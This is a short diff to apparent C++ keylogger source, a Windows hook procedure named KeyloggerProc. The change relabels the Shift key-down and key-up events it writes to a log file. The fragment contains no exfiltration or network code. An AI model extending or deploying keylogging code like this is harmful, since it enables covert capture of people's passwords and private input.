@@ -584,7 +584,7 @@ LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Handle Shift keys
             if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                 isShiftDown = true;
-                fo << "[CTRL SHIFT] ";
+                fo << "[SHIFT DOWN] ";
             }
             // Handle Control keys
             else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
@@ -649,7 +649,7 @@ LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Handle Shift keys
             if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                 isShiftDown = false;
-                fo << "[CTRL SHIFT] ";
+                fo << "[SHIFT UP] ";
             }
             // Handle Control keys
             else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
